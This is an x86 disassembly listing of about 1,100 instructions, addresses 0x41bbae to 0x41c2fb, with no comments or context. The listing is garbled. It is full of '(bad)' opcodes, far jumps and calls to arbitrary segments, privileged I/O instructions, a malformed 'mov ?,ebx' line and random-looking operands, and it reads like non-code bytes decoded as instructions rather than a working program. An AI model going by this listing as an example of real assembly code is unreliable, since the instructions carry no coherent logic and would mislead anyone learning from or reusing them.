  41bbae:	mov    eax,ds:0xfc7b6415
  41bbb3:	xchg   ebx,eax
  41bbb4:	lock adc eax,0xb05365fe
  41bbba:	mov    ebx,0xe4ce7e1b
  41bbbf:	fdivr  QWORD PTR [eax]
  41bbc1:	les    edi,FWORD PTR [edx-0x6acf0000]
  41bbc7:	cmp    DWORD PTR ds:0x7cec268e,ebx
  41bbcd:	jmp    0x6529:0x21c18e63
  41bbd4:	pop    ecx
  41bbd5:	(bad)  
  41bbd6:	retf   0x6e9
  41bbd9:	imul   ebx,DWORD PTR [ebx],0x9f7290b1
  41bbdf:	mov    bl,0x4d
  41bbe1:	bound  esi,QWORD PTR [edx]
  41bbe3:	cmp    DWORD PTR [ebx-0x51],esi
  41bbe6:	adc    BYTE PTR [edi],0x87
  41bbe9:	pop    ebp
  41bbea:	xchg   esp,eax
  41bbeb:	jge    0x41bc29
  41bbed:	imul   eax,DWORD PTR [ebp+0x1cb43b14],0xffffff85
  41bbf4:	dec    esi
  41bbf5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bbf6:	and    DWORD PTR [ebp-0x1e46c382],0x7b893c3c
  41bc00:	(bad)  
  41bc01:	xor    dl,BYTE PTR [ecx-0x25]
  41bc04:	sar    ebx,0x52
  41bc07:	repnz aad 0xba
  41bc0a:	adc    al,0x27
  41bc0c:	arpl   dx,bx
  41bc0e:	sbb    BYTE PTR [eax-0x5570e430],dh
  41bc14:	jmp    0x41bc16
  41bc16:	das    
  41bc17:	add    BYTE PTR [eax],al
  41bc19:	fwait
  41bc1a:	lahf   
  41bc1b:	push   es
  41bc1c:	inc    edx
  41bc1d:	adc    eax,ebp
  41bc1f:	sub    BYTE PTR ds:0x8cedabce,bl
  41bc25:	scas   al,BYTE PTR es:[edi]
  41bc26:	add    BYTE PTR [eax],al
  41bc28:	or     BYTE PTR [eax+0x0],cl
  41bc2b:	add    BYTE PTR [esi+0x1021f5c6],cl
  41bc31:	push   eax
  41bc32:	lahf   
  41bc33:	mov    edi,0xa23317dc
  41bc38:	call   0xbb10:0xadc3fada
  41bc3f:	xchg   edi,eax
  41bc40:	popa   
  41bc41:	jb     0x41bc3b
  41bc43:	sub    eax,0xc44ee7eb
  41bc48:	lods   al,BYTE PTR ds:[esi]
  41bc49:	add    BYTE PTR [eax],al
  41bc4b:	aas    
  41bc4c:	loopne 0x41bc3d
  41bc4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc4f:	dec    ebp
  41bc50:	outs   dx,BYTE PTR ds:[esi]
  41bc51:	mov    edx,0xb8478786
  41bc56:	sbb    dh,BYTE PTR [esi+0xa]
  41bc59:	mov    ecx,0x12c9dc3a
  41bc5e:	sbb    bl,0x0
  41bc61:	add    BYTE PTR [ebp+ecx*1+0x1b07e08a],bl
  41bc68:	rol    eax,1
  41bc6a:	fiadd  DWORD PTR [eax]
  41bc6c:	add    BYTE PTR [eax],bh
  41bc6e:	enter  0xc3,0x0
  41bc72:	xchg   ebx,eax
  41bc73:	cmp    al,0xb
  41bc75:	inc    edi
  41bc76:	mov    DWORD PTR [esi-0x28],edx
  41bc79:	ds inc ebx
  41bc7b:	out    0x90,eax
  41bc7d:	push   ecx
  41bc7e:	xchg   ebp,eax
  41bc7f:	add    bl,BYTE PTR [ebp+0x7a0b3269]
  41bc85:	pop    ecx
  41bc86:	test   DWORD PTR [ebx+0x160ef313],0xbfc7d0f4
  41bc90:	je     0x41bca7
  41bc92:	mov    ebx,ebx
  41bc94:	ins    DWORD PTR es:[edi],dx
  41bc95:	pop    esp
  41bc96:	dec    ebp
  41bc97:	mov    esp,0x6ff18fb2
  41bc9c:	push   0xffffff84
  41bc9e:	xor    eax,0xfc120000
  41bca3:	sbb    DWORD PTR [ebp+0x682581c5],edi
  41bca9:	sahf   
  41bcaa:	test   BYTE PTR [edx],bl
  41bcac:	add    BYTE PTR [eax],al
  41bcae:	stos   BYTE PTR es:[edi],al
  41bcaf:	cmp    DWORD PTR [esi-0x1b848373],ebp
  41bcb5:	add    DWORD PTR [ebp-0x2a],ecx
  41bcb8:	push   esi
  41bcb9:	xchg   esp,eax
  41bcba:	push   edi
  41bcbb:	sahf   
  41bcbc:	lods   eax,DWORD PTR ds:[esi]
  41bcbd:	inc    esp
  41bcbe:	lods   eax,DWORD PTR ds:[esi]
  41bcbf:	add    BYTE PTR [eax],al
  41bcc1:	rol    DWORD PTR [ebx-0x4e],0xf3
  41bcc5:	cmp    ebp,edi
  41bcc7:	add    esi,edx
  41bcc9:	das    
  41bcca:	pop    edi
  41bccb:	lods   al,BYTE PTR ds:[esi]
  41bccc:	mov    ebp,esi
  41bcce:	adc    DWORD PTR [edi],ecx
  41bcd0:	and    al,0x9a
  41bcd2:	xor    esi,DWORD PTR [ebp-0x69]
  41bcd5:	and    ebx,DWORD PTR [edx+0x2d98090a]
  41bcdb:	xor    DWORD PTR [esi+esi*1],0x5
  41bcdf:	push   cs
  41bce0:	inc    esi
  41bce1:	and    DWORD PTR [ecx+0x31],edx
  41bce4:	dec    edx
  41bce5:	ret    0x80a5
  41bce8:	cwde   
  41bce9:	add    BYTE PTR [eax],al
  41bceb:	pushf  
  41bcec:	pop    ebp
  41bced:	into   
  41bcee:	shr    BYTE PTR [edi+0x791cbd1d],cl
  41bcf4:	out    dx,al
  41bcf5:	or     eax,0x1fc42e30
  41bcfa:	add    BYTE PTR [eax],al
  41bcfc:	mov    WORD PTR [eax-0x51b80000],es
  41bd02:	add    BYTE PTR [eax],al
  41bd04:	xchg   edi,eax
  41bd05:	daa    
  41bd06:	and    edi,DWORD PTR [ebx+0x38]
  41bd09:	fwait
  41bd0a:	sbb    dh,bl
  41bd0c:	mov    ds:0xdb48b0,al
  41bd11:	add    BYTE PTR [ebp+ebp*8+0x0],cl
  41bd15:	add    BYTE PTR [ebx+0xa97456f],ch
  41bd1b:	mov    eax,DWORD PTR [esi-0x4688c9d0]
  41bd21:	iret   
  41bd22:	lahf   
  41bd23:	sbb    al,0x4a
  41bd25:	into   
  41bd26:	jl     0x41bcc1
  41bd28:	mov    al,ds:0x3aaaba28
  41bd2d:	inc    ecx
  41bd2e:	out    0x8,eax
  41bd30:	cli    
  41bd31:	add    BYTE PTR [eax],al
  41bd33:	cmp    esp,DWORD PTR [ebp+eax*8-0x5a]
  41bd37:	cld    
  41bd38:	in     eax,0x8a
  41bd3a:	mov    al,ds:0xc684a149
  41bd3f:	add    BYTE PTR [eax],al
  41bd41:	mov    eax,0x71fe74a9
  41bd46:	sti    
  41bd47:	ror    BYTE PTR [ebx+0x770c],cl
  41bd4d:	jmp    0x66b5:0x701495e6
  41bd54:	xor    BYTE PTR [esi],cl
  41bd56:	retf   
  41bd57:	fisubr DWORD PTR [edi]
  41bd59:	sbb    eax,0xa1db565c
  41bd5e:	mov    dl,0x21
  41bd60:	nop
  41bd61:	xchg   edi,eax
  41bd62:	mov    bl,0x6b
  41bd64:	ds stos BYTE PTR es:[edi],al
  41bd66:	mov    ebx,0x1b027d33
  41bd6b:	adc    BYTE PTR [ecx],dl
  41bd6d:	mov    ecx,0x81636474
  41bd72:	lea    esp,[edx]
  41bd74:	mov    ah,0x7d
  41bd76:	push   edi
  41bd77:	push   esi
  41bd78:	push   0xfb319320
  41bd7d:	jb     0x41bd4b
  41bd7f:	cmp    BYTE PTR [eax],al
  41bd81:	add    BYTE PTR [esi-0x762f8d7d],bl
  41bd87:	adc    edi,DWORD PTR [eax-0x300f20e3]
  41bd8d:	push   0x4a
  41bd8f:	loopne 0x41bd5c
  41bd91:	mov    ds:0xd86ddc65,al
  41bd96:	push   ecx
  41bd97:	mov    DWORD PTR [ebp-0x3a8b68c5],eax
  41bd9d:	dec    esi
  41bd9e:	ins    DWORD PTR es:[edi],dx
  41bd9f:	pop    edi
  41bda0:	push   edx
  41bda1:	push   eax
  41bda2:	sbb    edx,ebp
  41bda4:	pop    edx
  41bda5:	(bad)  
  41bda6:	mov    esp,0x26a16c69
  41bdab:	sub    al,0x36
  41bdad:	sbb    eax,0x928a0dd
  41bdb2:	fisubr WORD PTR [edi]
  41bdb4:	sub    al,0xe6
  41bdb6:	xchg   edx,eax
  41bdb7:	fsubr  DWORD PTR [ebx]
  41bdb9:	jmp    0x41bd49
  41bdbb:	or     DWORD PTR [edx-0x2],edi
  41bdbe:	and    BYTE PTR [eax],0x0
  41bdc1:	add    BYTE PTR [eax],bh
  41bdc3:	mov    ah,0x93
  41bdc5:	lock mov al,ds:0x58a5fdaf
  41bdcb:	imul   edx,DWORD PTR [edx],0xffffffe8
  41bdce:	and    eax,0x370c82
  41bdd3:	add    bh,dl
  41bdd5:	fisub  WORD PTR ds:0x9f84
  41bddb:	shr    DWORD PTR [edx+0x2c],0xe9
  41bddf:	jnp    0x41be0d
  41bde1:	pop    edx
  41bde2:	lahf   
  41bde3:	js     0x41be63
  41bde5:	bound  edx,QWORD PTR [ebx-0x31]
  41bde8:	push   edx
  41bde9:	xchg   ebx,eax
  41bdea:	xchg   ebp,eax
  41bdeb:	out    0x46,al
  41bded:	or     cl,dh
  41bdef:	iret   
  41bdf0:	mov    es,WORD PTR [edx+0x4ec842]
  41bdf6:	add    bh,cl
  41bdf8:	add    DWORD PTR [ebx+0x44],edx
  41bdfb:	mov    ecx,0xa5390000
  41be00:	add    eax,0x4fcea4f2
  41be05:	fdiv   DWORD PTR [ebp+eiz*8+0x25b3abaf]
  41be0c:	push   0x77
  41be0e:	sbb    al,0x61
  41be10:	mov    esi,0xf85237f9
  41be15:	and    al,0xe5
  41be17:	in     eax,dx
  41be18:	xchg   BYTE PTR [edx],ch
  41be1a:	pop    edx
  41be1b:	jle    0x41bde5
  41be1d:	fiadd  WORD PTR [eax]
  41be1f:	add    dh,bl
  41be21:	aas    
  41be22:	sub    esi,DWORD PTR [esi+0x41ddfe8e]
  41be28:	addr16 dec eax
  41be2a:	jne    0x41be2c
  41be2c:	add    BYTE PTR [edi+0x45],al
  41be2f:	jns    0x41be5e
  41be31:	sbb    ah,BYTE PTR [eax-0x5]
  41be34:	in     eax,0xfb
  41be36:	jecxz  0x41be8d
  41be38:	(bad)  
  41be39:	push   ebp
  41be3a:	jnp    0x41beb1
  41be3c:	xchg   ebp,eax
  41be3d:	xchg   DWORD PTR [ebx+0x3f12fe],esp
  41be43:	or     BYTE PTR [eax],al
  41be45:	add    BYTE PTR [ecx],al
  41be47:	xchg   edx,eax
  41be48:	mov    edx,0xd47ca81d
  41be4d:	nop
  41be4e:	ins    DWORD PTR es:[edi],dx
  41be4f:	aas    
  41be50:	mov    ebp,0x8f4860db
  41be55:	add    BYTE PTR [eax],al
  41be57:	add    ebx,DWORD PTR [eax+0x277d6c54]
  41be5d:	pushf  
  41be5e:	push   edx
  41be5f:	xor    ebx,0x64
  41be62:	test   DWORD PTR [ebx],ecx
  41be64:	adc    al,0x17
  41be66:	sbb    eax,edi
  41be68:	nop
  41be69:	xchg   BYTE PTR [esi-0x38],ah
  41be6c:	test   eax,0xb3570000
  41be71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be72:	jg     0x41be6c
  41be74:	xor    ah,BYTE PTR [edx+0x13]
  41be77:	sub    dl,BYTE PTR [eax+0x7cfd877b]
  41be7d:	dec    ebx
  41be7e:	push   edi
  41be7f:	pop    ds
  41be80:	or     al,BYTE PTR [edi+0x49]
  41be83:	xor    DWORD PTR [edx+0xfcc8d1],0x0
  41be8a:	and    DWORD PTR es:[eax-0x15],ecx
  41be8e:	add    BYTE PTR [eax],al
  41be90:	sbb    dh,BYTE PTR [esi-0x7d6fc744]
  41be96:	nop
  41be97:	add    eax,0x25585d29
  41be9c:	add    esp,DWORD PTR [ebp-0x76]
  41be9f:	lods   al,BYTE PTR ds:[esi]
  41bea0:	and    BYTE PTR [ebx-0x7fa7a4a3],0x74
  41bea7:	add    BYTE PTR [eax],al
  41bea9:	dec    esi
  41beaa:	fistp  QWORD PTR [esi+eiz*8-0x6c]
  41beae:	add    eax,0x1a56f0d9
  41beb3:	jbe    0x41be77
  41beb5:	cmc    
  41beb6:	and    DWORD PTR [ebp-0x2],ecx
  41beb9:	mov    eax,DWORD PTR [edx+ebx*2]
  41bebc:	add    BYTE PTR [eax],al
  41bebe:	push   ebx
  41bebf:	ret    
  41bec0:	xor    eax,0x3bc894
  41bec5:	add    BYTE PTR [ebx+0xc],dl
  41bec8:	add    BYTE PTR [eax],0x0
  41becb:	aas    
  41becc:	aad    0x7b
  41bece:	leave  
  41becf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bed0:	outs   dx,DWORD PTR ds:[esi]
  41bed1:	inc    esi
  41bed2:	mov    al,ds:0x94049505
  41bed7:	add    BYTE PTR [eax],al
  41bed9:	mov    dl,0x6e
  41bedb:	and    DWORD PTR [edi*2+0x541f0000],ecx
  41bee2:	fldenv [ecx-0x31aef06a]
  41bee8:	cmp    eax,0x4eb374c9
  41beed:	clc    
  41beee:	fisubr WORD PTR [edi+0x11068bfe]
  41bef4:	ror    DWORD PTR [eax-0x4e],1
  41bef7:	add    BYTE PTR [eax],al
  41bef9:	out    dx,al
  41befa:	sti    
  41befb:	adc    ebx,DWORD PTR [ecx-0x314f7ae0]
  41bf01:	pop    esi
  41bf02:	xchg   esi,eax
  41bf03:	fstp   QWORD PTR [ecx+0xfac0a5]
  41bf09:	add    BYTE PTR [ebp-0x53],ch
  41bf0c:	popf   
  41bf0d:	xor    cl,ch
  41bf0f:	pop    edx
  41bf10:	inc    edx
  41bf11:	addr16 nop
  41bf13:	aad    0xca
  41bf15:	cdq    
  41bf16:	sahf   
  41bf17:	and    al,0xec
  41bf19:	mov    DWORD PTR [edi-0x11],ecx
  41bf1c:	frstor [edi]
  41bf1e:	jecxz  0x41bf24
  41bf20:	std    
  41bf21:	add    BYTE PTR [eax],al
  41bf23:	or     ah,BYTE PTR [ecx-0x5b]
  41bf26:	sar    edi,cl
  41bf28:	fdiv   st(5),st
  41bf2a:	xchg   ebx,eax
  41bf2b:	sbb    al,0x1c
  41bf2d:	(bad)  [esi]
  41bf2f:	sub    esp,edx
  41bf31:	and    al,0x92
  41bf33:	je     0x41bf6f
  41bf35:	xor    DWORD PTR [ebx],ebp
  41bf37:	call   0xa321:0xf7521b92
  41bf3e:	imul   DWORD PTR [eax]
  41bf40:	(bad)  
  41bf41:	xchg   esp,eax
  41bf42:	add    esp,DWORD PTR [edi-0x7c1c07e6]
  41bf48:	push   ebx
  41bf49:	pop    DWORD PTR [esi+0x29]
  41bf4c:	mov    BYTE PTR [esi+0x56520000],ah
  41bf52:	and    al,al
  41bf54:	add    DWORD PTR [eax],eax
  41bf56:	add    BYTE PTR [eax-0x4affff02],al
  41bf5c:	jmp    0x41bf9f
  41bf5e:	inc    ebx
  41bf5f:	sbb    edi,DWORD PTR [ebx-0x62]
  41bf62:	stc    
  41bf63:	jae    0x41bf25
  41bf65:	imul   eax,DWORD PTR [eax],0x0
  41bf68:	mov    dl,0xb6
  41bf6a:	mov    dh,0x9f
  41bf6c:	mov    ah,0x27
  41bf6e:	loope  0x41bf6b
  41bf70:	lods   eax,DWORD PTR ds:[esi]
  41bf71:	iret   
  41bf72:	adc    esp,0xefc4d0
  41bf78:	add    cl,al
  41bf7a:	xor    BYTE PTR [ecx],ch
  41bf7c:	dec    edx
  41bf7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf7e:	call   0x7abf628
  41bf83:	cmp    BYTE PTR ds:0xd8e0563c,dl
  41bf89:	mov    al,BYTE PTR [esi+0x57e1d7ab]
  41bf8f:	fs jbe 0x41bf96
  41bf92:	(bad)  
  41bf93:	add    BYTE PTR [eax],al
  41bf95:	xabort 0xd8
  41bf98:	lea    edx,[eax]
  41bf9a:	sub    DWORD PTR [edx+0x3f],esi
  41bf9d:	push   eax
  41bf9e:	or     BYTE PTR [eax-0x7dffff2b],0x92
  41bfa5:	retf   
  41bfa6:	add    esi,esi
  41bfa8:	pop    edi
  41bfa9:	xchg   ebp,eax
  41bfaa:	or     edx,esp
  41bfac:	popa   
  41bfad:	or     esi,ebp
  41bfaf:	icebp  
  41bfb0:	pop    ebp
  41bfb1:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bfb3:	clc    
  41bfb4:	xor    bl,BYTE PTR [ebx+0x580c1e94]
  41bfba:	add    BYTE PTR [eax],al
  41bfbc:	pop    edi
  41bfbd:	xor    bl,BYTE PTR ds:0x9a81d123
  41bfc3:	inc    edx
  41bfc4:	stos   DWORD PTR es:[edi],eax
  41bfc5:	mov    BYTE PTR [ecx-0x60260000],dh
  41bfcb:	mov    ch,0xba
  41bfcd:	jge    0x41bf52
  41bfcf:	icebp  
  41bfd0:	push   0x0
  41bfd2:	push   ss
  41bfd3:	add    BYTE PTR [eax],al
  41bfd5:	lock cs rcr bl,1
  41bfd9:	jb     0x41c047
  41bfdb:	jne    0x41c00f
  41bfdd:	test   al,0xb9
  41bfdf:	mov    eax,gs:0xb6c5ff9c
  41bfe5:	jmp    0x41c03b
  41bfe7:	cmp    edi,DWORD PTR [ebx+esi*1]
  41bfea:	cmp    al,0xe9
  41bfec:	mov    edx,0xb984
  41bff1:	fwait
  41bff2:	outs   dx,DWORD PTR ds:[esi]
  41bff3:	push   ds
  41bff4:	cmc    
  41bff5:	sub    ah,BYTE PTR [esi+0x523a5667]
  41bffb:	cmp    DWORD PTR [ebp-0x3c8575b5],ebp
  41c001:	sbb    eax,ebx
  41c003:	sbb    DWORD PTR [edi+0x48],ecx
  41c006:	inc    ebx
  41c007:	add    BYTE PTR [eax],al
  41c009:	pop    esi
  41c00a:	arpl   cx,si
  41c00c:	adc    dl,BYTE PTR [esi]
  41c00e:	sbb    al,0xf3
  41c010:	xor    edi,ecx
  41c012:	stos   DWORD PTR es:[edi],eax
  41c013:	mov    edx,0xe681c130
  41c018:	mov    cl,0x1b
  41c01a:	sti    
  41c01b:	(bad)  
  41c01c:	gs jns 0x41c076
  41c01f:	ins    DWORD PTR es:[edi],dx
  41c020:	es cmp al,0x12
  41c023:	call   0xdb97:0xbffe2e6e
  41c02a:	div    BYTE PTR [ecx+0x2e]
  41c02d:	inc    edx
  41c02e:	icebp  
  41c02f:	dec    esp
  41c030:	add    DWORD PTR [eax],0x50e16700
  41c036:	xchg   BYTE PTR [ecx+edx*4-0x65abab1],ah
  41c03d:	gs test edx,ebx
  41c040:	aam    0xb2
  41c042:	popa   
  41c043:	imul   esi,DWORD PTR [esi],0x4b66f6f4
  41c049:	imul   eax,esi,0xa5f9551c
  41c04f:	(bad)  [ecx]
  41c051:	inc    eax
  41c052:	dec    edi
  41c053:	add    BYTE PTR [eax],al
  41c055:	mov    DWORD PTR [ebp+0x6950760e],ecx
  41c05b:	pop    edx
  41c05c:	push   ecx
  41c05d:	inc    edx
  41c05e:	pushf  
  41c05f:	jo     0x41c001
  41c061:	lods   al,BYTE PTR ds:[esi]
  41c062:	fild   DWORD PTR [edx+0x53]
  41c065:	cmp    DWORD PTR [ecx],0xffffff8a
  41c068:	mov    ebp,0x4d0f629b
  41c06d:	pop    edx
  41c06e:	jnp    0x41c0cc
  41c070:	dec    eax
  41c071:	jns    0x41c073
  41c073:	add    bl,dh
  41c075:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c076:	sub    eax,0x8cf12927
  41c07b:	inc    eax
  41c07c:	add    BYTE PTR [eax],al
  41c07e:	aaa    
  41c07f:	cmp    al,0xc3
  41c081:	sub    al,bl
  41c083:	xor    al,0x51
  41c085:	dec    ecx
  41c086:	mov    ecx,0x20b2246a
  41c08b:	and    DWORD PTR [ebx-0x32],ebp
  41c08e:	loope  0x41c0ab
  41c090:	ficom  WORD PTR [esi+0x30906b62]
  41c096:	mov    esp,0xb1ea35e2
  41c09b:	sbb    BYTE PTR cs:[eax+0x6e],cl
  41c09f:	add    BYTE PTR [eax],al
  41c0a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c0a2:	fs jmp 0x41c07f
  41c0a5:	into   
  41c0a6:	sbb    edx,DWORD PTR [eax-0x62]
  41c0a9:	mov    eax,ds:0x13e7c52b
  41c0ae:	iret   
  41c0af:	sbb    dl,ah
  41c0b1:	test   DWORD PTR [eax+ebx*4],esi
  41c0b4:	push   0x48
  41c0b6:	pop    esi
  41c0b7:	add    BYTE PTR [eax],al
  41c0b9:	or     BYTE PTR [ecx+0x0],dl
  41c0bc:	add    BYTE PTR [esi],bh
  41c0be:	and    eax,0x83c7aea7
  41c0c3:	pop    ecx
  41c0c4:	imul   DWORD PTR [edi+0xc0c0dd]
  41c0ca:	add    BYTE PTR [esi],ah
  41c0cc:	ins    DWORD PTR es:[edi],dx
  41c0cd:	mov    edi,0x780c
  41c0d2:	jle    0x41c114
  41c0d4:	pop    esp
  41c0d5:	add    BYTE PTR [eax],al
  41c0d7:	loop   0x41c0c1
  41c0d9:	sub    BYTE PTR [ecx+edx*4+0x84c],bh
  41c0e0:	div    DWORD PTR [esi+0x3e7ac5e7]
  41c0e6:	push   ebp
  41c0e7:	jb     0x41c0c0
  41c0e9:	cdq    
  41c0ea:	stos   DWORD PTR es:[edi],eax
  41c0eb:	sbb    DWORD PTR [edx+0x6af3c6b5],esp
  41c0f1:	push   edi
  41c0f2:	dec    edx
  41c0f3:	outs   dx,DWORD PTR ds:[esi]
  41c0f4:	push   esp
  41c0f5:	push   edi
  41c0f6:	loopne 0x41c15e
  41c0f8:	mov    ds:0xfb7f1c09,eax
  41c0fd:	ins    BYTE PTR es:[edi],dx
  41c0fe:	scas   al,BYTE PTR es:[edi]
  41c0ff:	(bad)  
  41c100:	jb     0x41c091
  41c102:	mov    eax,ds:0x34794197
  41c107:	jmp    0x41c0c5
  41c109:	cmp    al,0xb5
  41c10b:	out    0x5c,al
  41c10d:	mov    dl,0x3e
  41c10f:	cmp    eax,0x3e712895
  41c114:	pop    ds
  41c115:	outs   dx,BYTE PTR ds:[esi]
  41c116:	push   edi
  41c117:	inc    eax
  41c118:	mov    eax,ds:0x5f590000
  41c11d:	inc    edi
  41c11e:	and    al,0x64
  41c120:	jo     0x41c196
  41c122:	mov    dl,0xd6
  41c124:	sub    eax,0xbe22aeba
  41c129:	push   cs
  41c12a:	xchg   ebx,eax
  41c12b:	call   0x9cd930ca
  41c130:	sbb    eax,0x53c4ec89
  41c135:	add    BYTE PTR [eax],al
  41c137:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c138:	fisubr DWORD PTR [eax-0xa1ec91e]
  41c13e:	test   ch,cl
  41c140:	add    BYTE PTR [eax],al
  41c142:	jmp    0x420c47
  41c147:	(bad)
  41c14b:	aas    
  41c14c:	es aad 0x28
  41c14f:	cmp    DWORD PTR [ebp+0x34],esp
  41c152:	jle    0x41c1d2
  41c154:	test   al,0x7e
  41c156:	xchg   edi,eax
  41c157:	push   ecx
  41c158:	xchg   edx,eax
  41c159:	cwde   
  41c15a:	in     al,0x94
  41c15c:	cdq    
  41c15d:	cmp    BYTE PTR [ebp-0xb133694],bl
  41c163:	(bad)  
  41c164:	xchg   edx,eax
  41c165:	dec    ebx
  41c166:	mov    eax,ds:0x7888
  41c16b:	push   esi
  41c16c:	pop    eax
  41c16d:	xor    BYTE PTR [ebx],dh
  41c16f:	xchg   ebx,eax
  41c170:	lahf   
  41c171:	push   ebx
  41c172:	inc    ebx
  41c173:	dec    edx
  41c174:	fld    QWORD PTR [edx-0x21]
  41c177:	sub    edx,DWORD PTR [ecx+ebp*1+0x26]
  41c17b:	jae    0x41c1ce
  41c17d:	idiv   DWORD PTR [edx+eiz*8]
  41c180:	jnp    0x41c152
  41c182:	inc    edx
  41c183:	rcr    BYTE PTR [eax+eax*1+0x0],0xe2
  41c188:	xchg   DWORD PTR [eax-0x22646be5],esp
  41c18e:	mov    dl,0x32
  41c190:	or     DWORD PTR [edi+edi*4],esi
  41c193:	test   DWORD PTR [edi-0x22812147],esp
  41c199:	pop    ss
  41c19a:	sub    al,0x1f
  41c19c:	cmp    edx,DWORD PTR [edx+0x57]
  41c19f:	in     al,dx
  41c1a0:	popf   
  41c1a1:	je     0x41c158
  41c1a3:	sbb    ebp,DWORD PTR [ebx-0x36a9aad6]
  41c1a9:	or     al,0xb
  41c1ab:	add    BYTE PTR [eax],al
  41c1ad:	pop    eax
  41c1ae:	xchg   esi,eax
  41c1af:	sub    BYTE PTR [edx+ebp*2+0x7f],bl
  41c1b3:	xlat   BYTE PTR ds:[ebx]
  41c1b4:	punpckhwd mm4,QWORD PTR [esp+edx*1+0x4808]
  41c1bc:	stos   BYTE PTR es:[edi],al
  41c1bd:	mov    al,ds:0xef7f319d
  41c1c2:	push   esi
  41c1c3:	mov    ecx,0xb222cf62
  41c1c8:	push   eax
  41c1c9:	cmp    bh,ch
  41c1cb:	pop    ebx
  41c1cc:	int    0xb8
  41c1ce:	out    0xce,al
  41c1d0:	pop    ebp
  41c1d1:	and    ecx,DWORD PTR [ebx*1-0x32220000]
  41c1d8:	pop    edi
  41c1d9:	loop   0x41c192
  41c1db:	pop    ss
  41c1dc:	dec    eax
  41c1dd:	fild   DWORD PTR [eax]
  41c1df:	add    BYTE PTR [ebp+0x5606d355],bh
  41c1e5:	pop    es
  41c1e6:	popf   
  41c1e7:	xchg   ebx,eax
  41c1e8:	and    eax,0x30fd25cb
  41c1ed:	test   DWORD PTR [esi-0x505938d4],ebx
  41c1f3:	inc    edx
  41c1f4:	fisub  DWORD PTR [esi+0x21635b06]
  41c1fa:	scas   eax,DWORD PTR es:[edi]
  41c1fb:	xor    eax,0xceb27e5a
  41c200:	adc    BYTE PTR [edi+0xfca7587],dl
  41c206:	sbb    DWORD PTR [ebx+edi*4+0x45],0x88c74905
  41c20e:	out    dx,eax
  41c20f:	add    BYTE PTR [eax],al
  41c211:	lea    ecx,[eax-0x72]
  41c214:	add    BYTE PTR [eax],al
  41c216:	das    
  41c217:	xchg   edi,eax
  41c218:	pop    edi
  41c219:	adc    DWORD PTR [eax],ebp
  41c21b:	arpl   WORD PTR [edi+esi*2+0x0],ax
  41c21f:	add    BYTE PTR [ebp-0x1aade314],al
  41c225:	iret   
  41c226:	hlt    
  41c227:	fs cmc 
  41c229:	or     BYTE PTR [eax],0x7a
  41c22c:	add    BYTE PTR [eax],al
  41c22e:	xchg   esp,eax
  41c22f:	cmp    esi,DWORD PTR [ebp+0xc104]
  41c235:	push   0xfffffffc
  41c237:	and    BYTE PTR [esi-0x79b142c4],dl
  41c23d:	xlat   BYTE PTR ds:[ebx]
  41c23e:	mov    gs,WORD PTR [edi+0x24]
  41c241:	adc    DWORD PTR [ebp+eax*2+0x592cc3bf],ebp
  41c248:	and    al,0xf7
  41c24a:	inc    ebx
  41c24b:	and    BYTE PTR [ebp-0x1a2a0c55],dl
  41c251:	xchg   esp,eax
  41c252:	inc    ebx
  41c253:	and    ecx,ecx
  41c255:	retf   
  41c256:	jmp    0x4bb11fce
  41c25b:	xchg   edi,eax
  41c25c:	in     al,dx
  41c25d:	or     BYTE PTR [eax+eax*1],ah
  41c260:	add    BYTE PTR [esi-0x19],dh
  41c263:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c264:	repnz idiv BYTE PTR [ebx-0x75374961]
  41c26b:	add    BYTE PTR [eax],al
  41c26d:	fisub  DWORD PTR [ebp+esi*4+0x13]
  41c271:	and    DWORD PTR [edi+0x6fe75842],esi
  41c277:	jno    0x41c2d9
  41c279:	mov    ?,ebx
  41c27b:	test   al,0x26
  41c27d:	pop    es
  41c27e:	fmul   st(5),st
  41c280:	push   ss
  41c281:	leavew 
  41c283:	(bad)  
  41c284:	mov    gs,WORD PTR [eax+edi*1+0x5402b]
  41c28b:	add    BYTE PTR [ebp+0x64],dl
  41c28e:	fadd   st(0),st
  41c290:	popa   
  41c291:	add    BYTE PTR [eax],al
  41c293:	mov    DWORD PTR [edi],ebp
  41c295:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c296:	ss int 0x29
  41c299:	and    DWORD PTR [esi],edi
  41c29b:	in     eax,dx
  41c29c:	int    0x48
  41c29e:	out    0x0,eax
  41c2a0:	add    cl,cl
  41c2a2:	mov    ah,BYTE PTR [ebx-0x5b]
  41c2a5:	int    0x18
  41c2a7:	(bad)  
  41c2a8:	mov    esp,0xb31fd7c6
  41c2ad:	cli    
  41c2ae:	rol    BYTE PTR [ebx+0x70],1
  41c2b1:	pop    eax
  41c2b2:	jg     0x41c284
  41c2b4:	sbb    DWORD PTR [ebp+0x6c],esi
  41c2b7:	aas    
  41c2b8:	push   es
  41c2b9:	sbb    bl,al
  41c2bb:	and    DWORD PTR [ebp-0x76],ecx
  41c2be:	sti    
  41c2bf:	inc    al
  41c2c1:	mov    ebp,0x64880000
  41c2c6:	add    BYTE PTR [eax],al
  41c2c8:	pop    esp
  41c2c9:	aas    
  41c2ca:	in     eax,0xb2
  41c2cc:	push   cs
  41c2cd:	and    DWORD PTR [ebx],ebp
  41c2cf:	ret    
  41c2d0:	mov    ds:0x5e4625e8,eax
  41c2d5:	(bad)  
  41c2d6:	sbb    DWORD PTR ds:0x51d71e4e,esi
  41c2dc:	jmp    0xf8c77c
  41c2e1:	add    BYTE PTR [ebx+0xd],dh
  41c2e4:	faddp  st(1),st
  41c2e6:	outs   dx,BYTE PTR ds:[esi]
  41c2e7:	sbb    DWORD PTR [ecx-0x3a],edi
  41c2ea:	mov    al,0xc
  41c2ec:	sub    DWORD PTR [eax],eax
  41c2ee:	add    BYTE PTR [ecx+0x37],ch
  41c2f1:	popa   
  41c2f2:	mov    BYTE PTR [eax+0x0],dh
  41c2f5:	add    BYTE PTR [edi-0x2a37cf03],dl
  41c2fb:	add    BYTE PTR [eax],al
